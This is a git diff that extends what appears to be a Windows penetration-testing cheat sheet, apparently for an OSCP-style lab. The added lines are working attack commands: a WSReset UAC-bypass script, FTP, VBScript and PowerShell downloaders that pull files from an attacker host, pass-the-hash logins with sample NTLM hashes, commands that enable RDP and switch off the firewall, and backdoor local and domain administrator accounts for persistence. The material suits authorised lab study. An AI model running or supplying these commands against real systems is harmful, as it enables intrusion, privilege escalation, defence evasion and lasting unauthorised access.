@@ -59,6 +59,27 @@ ftype powershellfile="%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.ex
 //$source_ip/$smb_share/tools_windows/EyeWitness.exe 
 ```
 
+Firewall rules:
+```
+netsh advfirewall firewall show rule name=all
+```
+
+UAC Bypass 
+```powershell
+$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
+$RegPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
+
+New-Item $RegPath -Force | Out-Null
+Set-ItemProperty -Path $RegPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null
+
+$Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden -PassThru
+$Process.WaitForExit()
+
+if (Test-Path $RegPath) {
+  Remove-Item $RegPath -Recurse -Force
+}
+```
+
 ### Domain Enumeration
 
 #### ShareFinder - Look for shares on network and check access under current user context & Log to file
@@ -429,6 +450,63 @@ perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://$source_ip/t
 
 ```
 
+```
+echo open $source_ip 21> ftp.txt
+echo USER offsec>> ftp.txt # username
+echo ftp>> ftp.txt # password
+echo bin>> ftp.txt # binary mode
+echo GET [file]>> ftp.txt
+echo bye>> ftp.txt
+ftp -v -n -s:ftp.txt
+```
+```
+echo open $source_ip 21>ftp.txt&echo USER offsec>>ftp.txt&echo ftp>>ftp.txt&echo bin>>ftp.txt&echo GET [file]>>ftp.txt&echo bye>>ftp.txt&ftp -v -n -s:ftp.txt
+```
+```
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+cscript wget.vbs http://$source_ip/[file] [file]
+```
+
+```
+echo $storageDir = $pwd >wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://$source_ip/[file]" >>wget.ps1
+echo $file = "[file]" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+```
+
+```
+upx -9 [.exe] # pack and compress a binary you wanna transfer
+ls -lah [.exe] # check whether it is less than 64kb
+exe2hex [.exe] # alternatively, `wine /usr/share/windows-binaries/exe2bat.exe [.exe] [.bat]`
+cat [.bat] | xclip -selection c # if remotely accessing kali, use `ssh -X`, a bit finicky though
+```
+
 ## Copy windows binaries
 ```bash
 copy //$source_ip/$smb_share/tools_windows/bin/Regexe.exe
@@ -489,6 +567,18 @@ runas /profile /user:administrator cmd
 ```bash 
 START /B cmd.exe
 ```
+```bash
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a //$target cmd.exe
+```
+```bash
+sekurlsa::pth /user:Administrateur /domain:<domain> /ntlm:cc36cf7a8514893efccd332446158b1a
+```
+```bash
+xfreerdp /u:Administrator /pth:aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 /v:$target -O
+```
+```
+winexe -U <user>%<password> //$target cmd.exe
+```
 
 ## Data Extraction
 
@@ -517,6 +607,11 @@ Enable RDP:
 ``` bat
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
+```
+netsh firewall add portopening TCP 3389 "Open Port 3389" ENABLE ALL
+netsh firewall set portopening TCP 3389 proxy ENABLE ALL
+netsh firewall set service RemoteDesktop enable
+```
 
 Disable UAC:
 ```bash
@@ -526,6 +621,13 @@ reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\sys
 Disable Firewall:
 ```bash 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+```
+```
+netsh firewall set opmode mode=disable exceptions=disable
+```
+```
+netsh advfirewall set currentprofile state off
+netsh advfirewall set allprofiles state off
 ```
 
 ## Admin to SYSTEM
@@ -559,7 +661,16 @@ encode="`echo $scriptblock | iconv -to-code UTF-16LE | base64 -w 0`”
 command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 ```
 
-
+## Persistance 
+```
+net user /add amxuser amxpass1234
+net localgroup administrators amxuser /add
+net localgroup "Remote Desktop Users" amxuser /add
+```
+```
+net user amxuser amxpass1234 /add /domain
+net group "Domain Admins" amxuser /add /domain
+```
 
 
 
@@ -587,4 +698,15 @@ Test to see if we can run Powershell:
 Test to see if we can run Powershell Version 2:
 ```
 @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -w hidden -noni -nop -i None -ex Bypass -C "$PSVersionTable"
+```
+grep IP:
+```
+grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
+```
+
+```
+dir /s /a proof.txt
+```
+```
+findstr /si "proof"
 ```
